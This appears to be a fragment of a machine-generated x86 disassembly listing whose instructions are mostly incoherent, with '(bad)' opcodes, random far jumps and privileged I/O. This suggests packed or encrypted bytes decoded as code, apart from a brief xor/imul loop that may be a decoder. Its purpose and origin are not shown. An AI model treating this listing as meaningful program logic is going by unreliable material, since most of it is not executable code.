  41c435:	mov    ecx,0xe5325c93
  41c43a:	into   
  41c43b:	lods   al,BYTE PTR ds:[esi]
  41c43c:	or     eax,0x7707c9c0
  41c441:	mov    dl,0x87
  41c443:	cli    
  41c444:	jmp    0xe1e573b5
  41c449:	loopne 0x41c4a0
  41c44b:	or     ebx,0x51
  41c44e:	xor    ebp,edi
  41c450:	mov    ebx,0xdc71cf4
  41c455:	mov    edx,esi
  41c457:	pushf  
  41c458:	xchg   esp,eax
  41c459:	shl    DWORD PTR [eax+0x7f34aa08],cl
  41c45f:	xchg   edx,eax
  41c460:	out    dx,al
  41c461:	sbb    DWORD PTR [ebp-0x55eb5c95],esp
  41c467:	inc    edi
  41c468:	adc    ch,dl
  41c46a:	test   BYTE PTR [edi+ebx*1+0xbd4ab0f],ch
  41c471:	mov    BYTE PTR [edi],al
  41c473:	mov    ch,0x10
  41c475:	mov    bl,0xf4
  41c477:	leave  
  41c478:	xchg   ecx,eax
  41c479:	sbb    esi,DWORD PTR [edx+0x22514c0b]
  41c47f:	aad    0xc3
  41c481:	add    DWORD PTR [ebx-0x14],eax
  41c484:	push   edx
  41c485:	js     0x41c451
  41c487:	dec    ebp
  41c488:	dec    ebp
  41c489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c48a:	lods   al,BYTE PTR ds:[esi]
  41c48b:	inc    edi
  41c48c:	loop   0x41c43e
  41c48e:	jno    0x41c43c
  41c490:	add    DWORD PTR [ecx],0x7bdf0d50
  41c496:	(bad)  
  41c497:	push   0x6d72d4e7
  41c49c:	aaa    
  41c49d:	stos   BYTE PTR es:[edi],al
  41c49e:	inc    eax
  41c49f:	iret   
  41c4a0:	aam    0xdd
  41c4a2:	jecxz  0x41c4f6
  41c4a4:	mov    dh,0xab
  41c4a6:	out    0xb5,eax
  41c4a8:	push   esp
  41c4a9:	dec    ebp
  41c4aa:	add    BYTE PTR [ebp-0xc],dh
  41c4ad:	js     0x41c512
  41c4af:	rcr    DWORD PTR [eax+0x38abde55],1
  41c4b5:	loop   0x41c509
  41c4b7:	cmp    eax,0x41a1af2d
  41c4bc:	or     esi,esp
  41c4be:	es mov esi,edx
  41c4c1:	in     al,dx
  41c4c2:	or     eax,0x4eb72fe4
  41c4c7:	int3   
  41c4c8:	sub    al,0x49
  41c4ca:	sahf   
  41c4cb:	adc    eax,0xdcca7048
  41c4d0:	shr    DWORD PTR [eax-0x4d],cl
  41c4d3:	xor    eax,DWORD PTR [edi-0x3a23890]
  41c4d9:	mul    DWORD PTR [eax-0x4f]
  41c4dc:	mov    al,0x1e
  41c4de:	cmp    eax,0xa37e2656
  41c4e3:	push   ss
  41c4e4:	rcl    BYTE PTR [ecx],0x94
  41c4e7:	fsub   DWORD PTR [ebx-0x837d32e]
  41c4ed:	je     0x41c529
  41c4ef:	inc    eax
  41c4f0:	adc    eax,0x24dafc74
  41c4f5:	jmp    0x126d:0x780dcd6a
  41c4fc:	(bad)  
  41c4fd:	repz dec edi
  41c4ff:	mov    bl,0xf9
  41c501:	mov    bl,0x5d
  41c503:	adc    DWORD PTR [edx-0x5ac27c4d],ebp
  41c509:	pcmpgtd mm7,QWORD PTR [edx]
  41c50c:	(bad)  
  41c50d:	jmp    0x6fcf:0x1d2e85a5
  41c514:	xor    al,0x62
  41c516:	cmc    
  41c517:	(bad)  
  41c518:	ret    0xffed
  41c51b:	mov    ah,BYTE PTR [ebx+0x5de26a8d]
  41c521:	or     eax,0xb59d1dad
  41c526:	or     bl,0xaf
  41c529:	add    esp,DWORD PTR [edi+0x57]
  41c52c:	add    DWORD PTR [eax],ebx
  41c52e:	mov    ebp,0xfaee203e
  41c533:	adc    ebx,esp
  41c535:	sar    BYTE PTR [ebx-0x3bd5ac2d],cl
  41c53b:	push   edx
  41c53c:	arpl   WORD PTR [edx+0x69bad948],sp
  41c542:	push   cs
  41c543:	dec    esi
  41c544:	iret   
  41c545:	pop    ss
  41c546:	pop    esp
  41c547:	adc    eax,0x92e39dcb
  41c54c:	adc    ebx,DWORD PTR [edi+0x32]
  41c54f:	adc    esi,DWORD PTR [esi-0x6a]
  41c552:	iret   
  41c553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c554:	sahf   
  41c555:	fist   DWORD PTR ds:0x62c336f1
  41c55b:	inc    esi
  41c55c:	ror    DWORD PTR [esi-0xe],cl
  41c55f:	lds    edi,FWORD PTR [edi]
  41c561:	add    BYTE PTR [esp+ecx*1-0x43],bl
  41c565:	mov    bl,0x3c
  41c567:	inc    eax
  41c568:	inc    edi
  41c569:	mov    cl,0xb4
  41c56b:	jecxz  0x41c577
  41c56d:	out    0xe3,eax
  41c56f:	(bad)  
  41c570:	stc    
  41c571:	lea    eax,[edi-0x17d24fa9]
  41c577:	lods   eax,DWORD PTR ds:[esi]
  41c578:	sbb    edi,DWORD PTR [edx-0x6e2d9f7c]
  41c57e:	mov    WORD PTR [ebx+ebp*4-0x3a],?
  41c582:	ins    DWORD PTR es:[edi],dx
  41c583:	xor    ecx,eax
  41c585:	xor    edx,eax
  41c587:	sub    ecx,edx
  41c589:	sub    ecx,esi
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	mov    ds:0xfedf2bf2,eax
  41c5d5:	loope  0x41c654
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	mov    bl,0xb1
  41c5de:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5e0:	xchg   esp,eax
  41c5e1:	mov    al,ds:0x5bd8e55f
  41c5e6:	add    al,0x84
  41c5e8:	addr16 inc esp
  41c5ea:	daa    
  41c5eb:	mov    bh,0x61
  41c5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ee:	sub    al,0x29
  41c5f0:	dec    edx
  41c5f1:	pop    es
  41c5f2:	sub    eax,0x5621aaf6
  41c5f7:	pusha  
  41c5f8:	xrelease mov BYTE PTR [ecx+0x69],al
  41c5fc:	pop    ds
  41c5fd:	pusha  
  41c5fe:	iret   
  41c5ff:	jns    0x41c661
  41c601:	in     eax,dx
  41c602:	sub    al,0xc
  41c604:	bound  ecx,QWORD PTR [ecx]
  41c606:	popa   
  41c607:	jbe    0x41c602
  41c609:	dec    edx
  41c60a:	scas   eax,DWORD PTR es:[edi]
  41c60b:	cmp    DWORD PTR [edi+esi*2],esp
  41c60e:	mov    eax,ds:0xe6197980
  41c613:	mov    ebx,0xa0a2a33f
  41c618:	dec    edx
  41c619:	out    0xda,al
  41c61b:	add    eax,0xac08968b
  41c620:	js     0x41c670
  41c622:	sahf   
  41c623:	jno    0x41c627
  41c625:	mov    WORD PTR [esi+esi*4-0x3c8f6fba],?
  41c62c:	jg     0x41c6a2
  41c62e:	push   ds
  41c62f:	out    dx,al
  41c630:	call   FWORD PTR [ecx-0x7070bc10]
  41c636:	(bad)  
  41c637:	xchg   BYTE PTR [edi+edx*8-0xc86e4be],dh
  41c63e:	out    dx,al
  41c63f:	loopne 0x41c627
  41c641:	xchg   ch,bh
  41c643:	mov    dl,0x63
  41c645:	jp     0x41c688
  41c647:	int3   
  41c648:	mov    ecx,0xba28e210
  41c64d:	jmp    DWORD PTR [edx+0x6e]
  41c650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c651:	(bad)  
  41c652:	and    al,BYTE PTR [eax+edi*4-0x1edad371]
  41c659:	jae    0x41c6b3
  41c65b:	mov    dh,0x2d
  41c65d:	mov    esp,0x35bfcd13
  41c662:	addr16 jo 0x41c638
  41c665:	leave  
  41c666:	retf   
  41c667:	lods   al,BYTE PTR ds:[esi]
  41c668:	push   0xffffffdd
  41c66a:	sahf   
  41c66b:	adc    al,0x9a
  41c66d:	xchg   BYTE PTR [ebx-0x1c],ah
  41c670:	xchg   ah,ah
  41c672:	jo     0x41c686
  41c674:	fld    DWORD PTR [ebx]
  41c676:	sar    DWORD PTR [eax],0xe3
  41c679:	(bad)  
  41c67a:	xor    eax,0x335352a
  41c67f:	enter  0x2251,0x15
  41c683:	ret    0xe8b
  41c686:	dec    esi
  41c687:	int    0xaa
  41c689:	inc    ebx
  41c68a:	or     BYTE PTR [eax],0x4c
  41c68d:	sub    eax,0xae394776
  41c692:	sub    DWORD PTR [eax+0xf],eax
  41c695:	mov    edx,esi
  41c697:	sbb    BYTE PTR [ebp-0x1ca18c3e],bh
  41c69d:	mov    ebp,0xaa778c7f
  41c6a2:	push   ebx
  41c6a3:	pushf  
  41c6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6a5:	jecxz  0x41c67b
  41c6a7:	xchg   BYTE PTR [ebp+0x42],dh
  41c6aa:	loop   0x41c72b
  41c6ac:	(bad)  
  41c6ad:	into   
  41c6ae:	adc    al,0x19
  41c6b0:	pop    ds
  41c6b1:	scas   al,BYTE PTR es:[edi]
  41c6b2:	push   es
  41c6b3:	aam    0xa1
  41c6b5:	xchg   esp,eax
  41c6b6:	shl    DWORD PTR [edi+ebp*8],1
  41c6b9:	clc    
  41c6ba:	hlt    
  41c6bb:	outs   dx,BYTE PTR ds:[esi]
  41c6bc:	loope  0x41c685
  41c6be:	shr    BYTE PTR [ecx+0x4e],0x73
  41c6c2:	dec    eax
  41c6c3:	lock mov es,WORD PTR [ebx+0x40]
  41c6c7:	jne    0x41c747
  41c6c9:	cmp    eax,0xe9f838e2
  41c6ce:	or     eax,ebp
  41c6d0:	push   eax
  41c6d1:	sub    ebp,edx
  41c6d3:	mov    ebx,DWORD PTR [ebp-0x13]
  41c6d6:	add    dl,ch
  41c6d8:	jo     0x41c713
  41c6da:	xchg   DWORD PTR [esi-0x38],ebx
  41c6dd:	aad    0xf5
  41c6df:	sahf   
  41c6e0:	int    0xb4
  41c6e2:	out    dx,eax
  41c6e3:	jge    0x41c745
  41c6e5:	sub    BYTE PTR [ebx],ah
  41c6e7:	(bad)  
  41c6e8:	jo     0x41c75f
  41c6ea:	aam    0x1a
  41c6ec:	xchg   ebx,eax
  41c6ed:	into   
  41c6ee:	sub    BYTE PTR [ebx+edi*2+0x7c],cl
  41c6f2:	sar    DWORD PTR [edx-0x6],1
  41c6f5:	std    
  41c6f6:	sub    BYTE PTR [ebx+0x6d],al
  41c6f9:	js     0x41c689
  41c6fb:	sahf   
  41c6fc:	fnsave [ebx+0x5b4b845]
  41c702:	packsswb mm2,QWORD PTR [edi+0x2]
  41c706:	push   ecx
  41c707:	retf   
  41c708:	sub    BYTE PTR [eax],0x3f
  41c70b:	test   eax,0x7646ca3a
  41c710:	jbe    0x41c6fc
  41c712:	enter  0xab83,0xf5
  41c716:	push   0x85b7ca7a
  41c71b:	sbb    al,BYTE PTR [edx+eax*2]
  41c71e:	ja     0x41c798
  41c720:	sub    ah,BYTE PTR [ecx+edi*1]
  41c723:	mov    bh,0x8a
  41c725:	fcomp  DWORD PTR [edi]
  41c727:	imul   BYTE PTR [ebx-0xbde85af]
  41c72d:	mov    ecx,0x5000caa5
  41c732:	push   edi
  41c733:	(bad)  
  41c734:	mov    dl,0x83
  41c736:	sti    
  41c737:	xchg   ecx,eax
  41c738:	adc    bl,BYTE PTR ds:0x17536f8a
  41c73e:	aam    0xca
  41c740:	cmp    BYTE PTR [esi-0x2e9bd121],0xf4
  41c747:	pop    esp
  41c748:	ret    0x50be
  41c74b:	cmp    ebx,DWORD PTR [edi-0x46]
  41c74e:	stos   BYTE PTR es:[edi],al
  41c74f:	gs mov dh,0xb6
  41c752:	daa    
  41c753:	add    eax,0x71528042
  41c758:	push   eax
  41c759:	push   ecx
  41c75a:	aam    0xbf
  41c75c:	mov    esi,0xf378737f
  41c761:	clc    
  41c762:	test   DWORD PTR [esi],esi
  41c764:	cs retf 0xca54
  41c768:	mov    eax,0xa5778a74
  41c76d:	mov    al,ds:0x329d175f
  41c772:	cmp    ecx,DWORD PTR [edi+eiz*4]
  41c775:	and    eax,0xe45bc59a
  41c77a:	pop    esp
  41c77b:	xor    eax,0xd4524283
  41c780:	imul   edx,edx,0xb48295b0
  41c786:	es int 0xb0
  41c789:	jge    0x41c75f
  41c78b:	mov    ds:0xc9fd0158,al
  41c791:	cmp    BYTE PTR [edx-0x35e79bf4],dh
  41c797:	add    BYTE PTR ds:0xf6f29bbb,ah
  41c79d:	int3   
  41c79e:	jo     0x41c81e
  41c7a0:	std    
  41c7a1:	pop    es
  41c7a2:	sbb    ch,BYTE PTR [eax-0x27d8a3b5]
  41c7a8:	fmul   DWORD PTR [esi+0x2db3812a]
  41c7ae:	sub    DWORD PTR [ebp+0xe],esi
  41c7b1:	js     0x41c789
  41c7b3:	fld    QWORD PTR [ebx]
  41c7b5:	inc    esi
  41c7b6:	mov    cl,0xd1
  41c7b8:	and    DWORD PTR [esi-0x74],0x3e7a93d4
  41c7bf:	sub    BYTE PTR [ebp+0x24be04e6],0x2
  41c7c6:	cdq    
  41c7c7:	ret    0x608c
  41c7ca:	loopne 0x41c832
  41c7cc:	fistp  DWORD PTR [eax-0x59]
  41c7cf:	mov    esi,0xf498213c
  41c7d4:	dec    edi
  41c7d5:	call   0xebc9:0xfa0ae22
  41c7dc:	inc    ebx
  41c7dd:	mov    al,ds:0x475bfaf
  41c7e2:	jne    0x41c81d
  41c7e4:	lods   al,BYTE PTR ds:[esi]
  41c7e5:	loopne 0x41c7f6
  41c7e7:	ins    DWORD PTR es:[edi],dx
  41c7e8:	call   0x8c5ae2e5
  41c7ed:	sti    
  41c7ee:	push   edx
  41c7ef:	test   BYTE PTR [edi+edi*8-0x7feb382d],ah
  41c7f6:	mov    bl,0x25
  41c7f8:	mov    ds:0x6a4a1b1b,eax
  41c7fd:	fwait
  41c7fe:	mov    ebx,0xfa483f9b
  41c803:	mov    esp,0x9c9f4b52
  41c808:	adc    BYTE PTR [edi],0x39
  41c80b:	aad    0xb5
  41c80d:	push   0x4ebe8aa2
  41c812:	stos   DWORD PTR es:[edi],eax
  41c813:	aas    
  41c814:	inc    ecx
  41c815:	inc    edx
  41c816:	outs   dx,BYTE PTR ds:[esi]
  41c817:	adc    DWORD PTR [edx+0x7c],edi
  41c81a:	scas   eax,DWORD PTR es:[edi]
  41c81b:	loopne 0x41c841
  41c81d:	out    dx,al
  41c81e:	pop    eax
  41c81f:	hlt    
  41c820:	jmp    0x97d6:0x37f5669d
  41c827:	aas    
  41c828:	add    eax,0xe5646283
  41c82d:	(bad)  
  41c82e:	sub    al,bl
  41c830:	xchg   esi,eax
  41c831:	mov    ch,0x6
  41c833:	into   
  41c834:	std    
  41c835:	add    eax,0x901bda96
  41c83a:	(bad)  
  41c83b:	push   0x41c5f3e5
  41c840:	fdiv   DWORD PTR [ebx]
  41c842:	pop    esi
  41c843:	and    esi,eax
  41c845:	loopne 0x41c850
  41c847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c848:	fwait
  41c849:	mov    cl,0xff
  41c84b:	scas   eax,DWORD PTR es:[edi]
  41c84c:	sbb    edi,esp
  41c84e:	in     al,0x5f
  41c850:	or     al,0x8c
  41c852:	xor    ecx,DWORD PTR [eax+0x2b]
  41c855:	jb     0x41c889
  41c857:	div    esi
  41c859:	mov    al,ds:0x9937bda3
  41c85e:	xchg   esp,eax
  41c85f:	xchg   edx,eax
  41c860:	ret    
  41c861:	out    dx,al
  41c862:	jns    0x41c817
  41c864:	popf   
  41c865:	mov    esp,0x2aebcf04
  41c86a:	mov    dh,0x54
  41c86c:	test   al,0x5d
  41c86e:	cmp    esp,DWORD PTR [eax-0x12]
  41c871:	cdq    
  41c872:	out    dx,al
  41c873:	stos   BYTE PTR es:[edi],al
  41c874:	leave  
  41c875:	pushf  
  41c876:	popf   
  41c877:	push   esi
  41c878:	and    eax,0xf0b254a8
  41c87d:	mov    DWORD PTR ds:0xd3acf474,eax
  41c883:	icebp  
  41c884:	mov    ch,0x3b
  41c886:	cmp    bl,dh
  41c888:	adc    DWORD PTR [edx-0x23],esp
  41c88b:	or     eax,0x47b006c5
  41c890:	fldcw  WORD PTR [esi-0x71]
  41c893:	add    esi,DWORD PTR [eax-0x365d7bb2]
  41c899:	stos   BYTE PTR es:[edi],al
  41c89a:	test   al,0xa
  41c89c:	mov    dh,0xc6
  41c89e:	or     ecx,DWORD PTR [esi-0x5d3455ae]
  41c8a4:	jp     0x41c914
  41c8a6:	ret    0x8ca
  41c8a9:	inc    esp
  41c8aa:	sti    
  41c8ab:	pop    esi
  41c8ac:	xor    eax,DWORD PTR [ebx]
  41c8ae:	gs ins BYTE PTR es:[edi],dx
  41c8b0:	adc    cl,BYTE PTR [edi-0x3a8a2ae8]
  41c8b6:	fcom   st(0)
  41c8b8:	add    edi,DWORD PTR [edx+0x7c59c523]
  41c8be:	cmp    BYTE PTR [ebp-0x4a],cl
  41c8c1:	test   eax,0x378df517
  41c8c6:	out    0x8f,eax
  41c8c8:	jg     0x41c86f
  41c8ca:	iret   
  41c8cb:	stos   BYTE PTR es:[edi],al
  41c8cc:	xor    eax,0xbfb0b34b
  41c8d1:	sub    ecx,0xf615d131
  41c8d7:	stc    
  41c8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8da:	cmp    ecx,DWORD PTR [edi+ebp*8-0x74e3b539]
  41c8e1:	sub    ch,bl
  41c8e3:	mov    edi,0x6e2fbf18
  41c8e8:	xchg   edx,esp
  41c8ea:	xchg   BYTE PTR [esi],bl
  41c8ec:	ret    
  41c8ed:	rcl    BYTE PTR [esi-0x6f],0x20
  41c8f1:	test   DWORD PTR [eax+edi*2],ebx
  41c8f4:	sbb    eax,0x9cacea66
  41c8f9:	and    DWORD PTR ss:[ebp-0x3c],esi
  41c8fd:	inc    edi
  41c8fe:	push   ebp
  41c8ff:	mov    cl,0x19
  41c901:	gs mov edx,0xb0e38c8a
  41c907:	daa    
  41c908:	loop   0x41c95e
  41c90a:	out    dx,eax
  41c90b:	jbe    0x41c96b
  41c90d:	iret   
  41c90e:	xor    ebp,DWORD PTR [ecx-0x30]
  41c911:	sbb    edi,DWORD PTR [ebp+0x23]
  41c914:	repz repz scas eax,DWORD PTR es:[edi]
  41c917:	in     al,0x65
  41c919:	and    BYTE PTR [edx-0x71d2e1a5],bl
  41c91f:	xchg   ebp,eax
  41c920:	shl    bh,cl
  41c922:	clc    
  41c923:	jle    0x41c954
  41c925:	dec    esi
  41c926:	xchg   edi,eax
  41c927:	push   edx
  41c928:	rcr    ebx,0xad
  41c92b:	push   ss
  41c92c:	cmp    DWORD PTR [edx],eax
  41c92e:	or     BYTE PTR [esi+0x77dc4127],cl
  41c934:	repnz data16 gs aas 
  41c938:	repnz dec ecx
  41c93a:	ins    BYTE PTR es:[edi],dx
  41c93b:	jne    0x41c8fa
  41c93d:	cmc    
  41c93e:	popa   
  41c93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c940:	pop    ds
  41c941:	fld    TBYTE PTR [ecx+eiz*4+0x51888f63]
  41c948:	adc    al,0x3b
  41c94a:	mov    esp,DWORD PTR [eax]
  41c94c:	ss xchg esp,eax
  41c94e:	inc    esi
  41c94f:	and    ebx,ebx
  41c951:	out    dx,eax
  41c952:	add    edi,ebx
  41c954:	push   edx
  41c955:	arpl   WORD PTR [edx-0x50b041e7],di
  41c95b:	push   ecx
  41c95c:	aas    
  41c95d:	mov    bh,0xdf
  41c95f:	loopne 0x41c942
  41c961:	mov    edi,0x7e676fc3
  41c967:	sbb    bl,dl
  41c969:	cmp    eax,0xe222ee54
  41c96e:	shr    BYTE PTR [edx],1
  41c970:	and    dl,BYTE PTR ds:0x43778f92
  41c976:	push   eax
  41c977:	and    al,0x93
  41c979:	mov    bh,0xba
  41c97b:	adc    DWORD PTR [ecx+eax*2+0x1709d6de],ecx
  41c982:	data16 mov al,0x6
  41c985:	adc    dl,BYTE PTR [ebp+0x7b481879]
  41c98b:	ret    
  41c98c:	retf   0x3858
  41c98f:	add    ah,BYTE PTR [eax-0x58]
  41c992:	out    0xdc,al
  41c994:	xchg   edi,eax
  41c995:	in     al,dx
  41c996:	inc    edx
  41c997:	sub    ebp,ebx
  41c999:	jbe    0x41c930
  41c99b:	adc    BYTE PTR [ecx+0x5c],al
  41c99e:	retf   0xdebc
  41c9a1:	mov    BYTE PTR [ebx+0x3],cl
  41c9a4:	in     al,0xbc
  41c9a6:	in     eax,dx
  41c9a7:	popf   
  41c9a8:	rol    BYTE PTR [edx-0x58],0xf4
  41c9ac:	adc    al,0xce
  41c9ae:	and    edx,DWORD PTR [esi+0x7377c1cb]
  41c9b4:	adc    esp,ebx
  41c9b6:	mov    esi,0x85746d89
  41c9bb:	idiv   ecx
  41c9bd:	fs push eax
  41c9bf:	sub    bh,0x7b
  41c9c2:	lods   al,BYTE PTR ds:[esi]
  41c9c3:	mov    eax,ds:0x2380b53f
  41c9c8:	dec    ebp
  41c9c9:	xor    esp,DWORD PTR [ebp+edx*8-0x80]
  41c9cd:	pop    esi
  41c9ce:	cmp    BYTE PTR [esi-0x257cfede],bh
  41c9d4:	int    0x99
  41c9d6:	add    edx,DWORD PTR [eax]
  41c9d8:	xor    cl,al
  41c9da:	cdq    
  41c9db:	sub    DWORD PTR [ebx-0x62],ebx
  41c9de:	adc    eax,0x5d1973be
  41c9e3:	add    al,0x14
  41c9e5:	bound  edx,QWORD PTR [esp+esi*4-0x38]
  41c9e9:	inc    ebx
  41c9ea:	jns    0x41ca39
  41c9ec:	xor    eax,0x9dfa9d9c
  41c9f1:	dec    eax
  41c9f2:	sbb    al,0x4f
  41c9f4:	mov    BYTE PTR [ebx+0x252f8f05],al
  41c9fa:	inc    edi
  41c9fb:	(bad)  [ebx-0x5c]
  41c9fe:	(bad)  
  41c9ff:	push   esi
  41ca00:	je     0x41c9aa
  41ca02:	sbb    BYTE PTR [ebx],dl
  41ca04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca05:	lods   al,BYTE PTR ds:[esi]
  41ca06:	mov    dl,0x66
  41ca08:	cli    
  41ca09:	pop    ebp
  41ca0a:	xchg   ebp,eax
  41ca0b:	jg     0x41ca6b
  41ca0d:	xor    ah,BYTE PTR [edi-0x899c907]
  41ca13:	add    BYTE PTR [edi+eax*4],ah
  41ca16:	adc    ebp,DWORD PTR [edi-0x7c]
  41ca19:	in     eax,dx
  41ca1a:	mov    ss,WORD PTR [ebx-0x423557fc]
  41ca20:	mov    eax,0xb2a1e033
  41ca25:	adc    dh,0xf9
  41ca28:	xlat   BYTE PTR ds:[ebx]
  41ca29:	push   ecx
  41ca2a:	outs   dx,DWORD PTR ds:[esi]
  41ca2b:	and    al,0xb9
  41ca2d:	mov    fs,eax
  41ca2f:	jbe    0x41ca07
  41ca31:	js     0x41ca08
  41ca33:	arpl   WORD PTR [eax],dx
  41ca35:	jge    0x41caa2
  41ca37:	xchg   ebp,eax
  41ca38:	push   esp
  41ca39:	mov    dh,0x28
  41ca3b:	pop    ss
  41ca3c:	push   ebp
  41ca3d:	out    0x27,eax
  41ca3f:	push   eax
  41ca40:	call   DWORD PTR [ecx]
  41ca42:	jle    0x41cabe
  41ca44:	daa    
  41ca45:	repz add DWORD PTR [edi+esi*8],ecx
  41ca49:	inc    edx
  41ca4a:	(bad)  
  41ca4b:	jge    0x41ca10
  41ca4d:	adc    BYTE PTR [esi],0xb7
  41ca50:	not    ebx
  41ca52:	inc    esi
  41ca53:	mov    al,ds:0xdf00720d
  41ca58:	mov    cl,0x29
  41ca5a:	mov    esp,0x145a1e12
  41ca5f:	pop    ebx
  41ca60:	push   0xffffffc8
  41ca62:	mov    dl,bh
  41ca64:	pop    ebp
  41ca65:	adc    ecx,edx
  41ca67:	adc    eax,DWORD PTR [eax-0x2c6597fd]
  41ca6d:	in     eax,dx
  41ca6e:	jge    0x41caae
  41ca70:	jbe    0x41cabd
  41ca72:	(bad)  
  41ca73:	pusha  
  41ca74:	mov    al,BYTE PTR [ebp+0x37]
  41ca77:	jmp    0x6959:0xeb94174d
  41ca7e:	sbb    esp,ebx
  41ca80:	dec    eax
  41ca81:	xchg   esp,eax
  41ca82:	daa    
  41ca83:	sbb    BYTE PTR [edx-0x6c],dl
  41ca86:	repz dec ebp
  41ca88:	mov    esi,0x8d3ab730
  41ca8d:	xchg   ebx,eax
  41ca8e:	cmp    al,0x4d
  41ca90:	repz push eax
  41ca92:	jbe    0x41ca5d
  41ca94:	mov    ch,0xd1
  41ca96:	sub    DWORD PTR [esi+0x5b4fe1a7],esp
  41ca9c:	jmp    FWORD PTR [ecx]
  41ca9e:	cld    
  41ca9f:	pop    esi
  41caa0:	mov    ebx,0x75011512
  41caa5:	loopne 0x41cb0a
  41caa7:	add    dl,dl
  41caa9:	add    esp,ebx
  41caab:	push   cs
  41caac:	cld    
  41caad:	ror    DWORD PTR [ebx],0xc7
  41cab0:	inc    ebx
  41cab1:	das    
  41cab2:	add    esi,ebx
  41cab4:	mov    ds:0x8867c97f,al
  41cab9:	lahf   
  41caba:	push   es
  41cabb:	sbb    ebp,DWORD PTR [eax-0xae3c0b4]
  41cac1:	inc    esp
  41cac2:	aaa    
  41cac3:	sahf   
  41cac4:	pop    esi
  41cac5:	mov    cl,0x85
  41cac7:	jns    0x41cb1a
  41cac9:	fst    QWORD PTR [ecx-0x3c]
  41cacc:	arpl   WORD PTR [esi],bp
  41cace:	das    
  41cacf:	(bad)
  41cad2:	hlt    
  41cad3:	sbb    al,0x22
  41cad5:	mov    ds:0x6cab4466,eax
  41cada:	jb     0x41cabe
  41cadc:	shl    DWORD PTR [ebp+0x79d5e5b6],1
  41cae2:	push   ebp
  41cae3:	adc    dl,BYTE PTR [edi+0x43]
  41cae6:	mov    BYTE PTR ds:0x69206835,0x4a
  41caed:	or     eax,0x39946d80
  41caf2:	lods   eax,DWORD PTR ds:[esi]
  41caf3:	retf   0xfad
  41caf6:	sub    DWORD PTR [ecx],edi
  41caf8:	je     0x41ca91
  41cafa:	ins    DWORD PTR es:[edi],dx
  41cafb:	fucom  st(0)
  41cafd:	pop    esp
  41cafe:	cmp    BYTE PTR ds:0x835d1f03,dh
  41cb04:	inc    ebp
  41cb05:	jge    0x41cb23
  41cb07:	mov    eax,esi
  41cb09:	inc    esi
  41cb0a:	mov    edi,0x9f942e01
  41cb0f:	cmc    
  41cb10:	mov    ebx,0x378e26b1
  41cb15:	lods   al,BYTE PTR gs:[esi]
  41cb17:	call   0xfceba509
  41cb1c:	test   eax,ecx
  41cb1e:	pop    ds
  41cb1f:	enter  0xe725,0xed
  41cb23:	lds    edx,FWORD PTR [eax]
  41cb25:	jle    0x41cb9c
  41cb27:	pop    ebp
  41cb28:	jbe    0x41cb16
  41cb2a:	or     BYTE PTR [esi-0x71],ch
  41cb2d:	dec    BYTE PTR [ecx]
  41cb2f:	scas   eax,DWORD PTR es:[edi]
  41cb30:	mov    ah,0x93
  41cb32:	jl     0x41cb98
  41cb34:	scas   al,BYTE PTR es:[edi]
  41cb35:	pop    edx
  41cb36:	xor    DWORD PTR [ebx],ebp
  41cb38:	arpl   WORD PTR [ebx+0x47ff771d],ax
  41cb3e:	or     al,0x93
  41cb40:	stos   BYTE PTR es:[edi],al
  41cb41:	jae    0x41cbc1
  41cb43:	and    bl,bl
  41cb45:	test   eax,0x6f06d886
  41cb4a:	jne    0x41cad6
  41cb4c:	push   ebp
  41cb4d:	inc    esp
  41cb4e:	pop    ebx
  41cb4f:	mov    bh,0x5
  41cb51:	jg     0x41cbad
  41cb53:	jmp    0x41cb2f
  41cb55:	lds    ebp,FWORD PTR [edi+0x1f]
  41cb58:	add    DWORD PTR [eax+eax*4-0x34],edx
  41cb5c:	cdq    
  41cb5d:	enter  0x11f8,0xb9
  41cb61:	push   eax
  41cb62:	cs out 0xe4,eax
  41cb65:	mov    ebp,0x680a52b5
  41cb6a:	clc    
  41cb6b:	ret    0xe203
  41cb6e:	sbb    ebp,ebx
  41cb70:	imul   esi,DWORD PTR [edi-0x6b28023e],0xe76484ee
  41cb7a:	stos   BYTE PTR es:[edi],al
  41cb7b:	push   esp
  41cb7c:	inc    ebp
  41cb7d:	mov    ecx,0x7d8e9e0d
  41cb82:	mov    al,0xd8
  41cb84:	dec    esp
  41cb85:	push   edx
  41cb86:	fwait
  41cb87:	xchg   edi,eax
  41cb88:	push   esp
  41cb89:	push   ds
  41cb8a:	mov    eax,0xc3f6dde1
  41cb8f:	shl    DWORD PTR [eax-0x5d],1
  41cb92:	mov    ah,0xa2
  41cb94:	ret    0x15d0
  41cb97:	fidiv  DWORD PTR [ecx-0x21ae1599]
  41cb9d:	pop    ds
